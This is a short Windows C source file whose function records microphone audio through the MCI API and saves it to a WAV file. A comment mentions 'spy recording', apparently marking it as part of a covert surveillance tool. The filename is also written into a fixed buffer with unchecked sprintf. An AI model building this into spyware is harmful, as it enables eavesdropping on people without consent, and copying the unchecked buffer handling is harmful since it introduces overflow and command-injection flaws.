#include <stdio.h>
#include <windows.h>
#include <mmsystem.h>
#include "audio.h"

#pragma comment(lib, "winmm.lib")

int record_audio(int duration_seconds, const char* output_filename) {
    char command[256];
    char buffer[256];

    // Open the waveaudio device
    sprintf(command, "open new type waveaudio alias myaudio");
    if (mciSendString(command, NULL, 0, NULL) != 0) {
        return -1;
    }

    // Set format
    sprintf(command, "set myaudio time format ms");
    mciSendString(command, NULL, 0, NULL);
    sprintf(command, "set myaudio bitspersample 16");
    mciSendString(command, NULL, 0, NULL);
    sprintf(command, "set myaudio samplespersec 44100");
    mciSendString(command, NULL, 0, NULL);
    sprintf(command, "set myaudio channels 1"); // Mono is usually sufficient for spy recording
    mciSendString(command, NULL, 0, NULL);
    sprintf(command, "set myaudio bytespersec 88200");
    mciSendString(command, NULL, 0, NULL);
    sprintf(command, "set myaudio alignment 2");
    mciSendString(command, NULL, 0, NULL);

    // Record
    sprintf(command, "record myaudio");
    if (mciSendString(command, NULL, 0, NULL) != 0) {
        mciSendString("close myaudio", NULL, 0, NULL);
        return -1;
    }

    // Wait for the duration
    Sleep(duration_seconds * 1000);

    // Stop recording
    sprintf(command, "stop myaudio");
    mciSendString(command, NULL, 0, NULL);

    // Save
    sprintf(command, "save myaudio \"%s\"", output_filename);
    if (mciSendString(command, NULL, 0, NULL) != 0) {
        mciSendString("close myaudio", NULL, 0, NULL);
        return -1;
    }

    // Close
    mciSendString("close myaudio", NULL, 0, NULL);

    return 0;
}
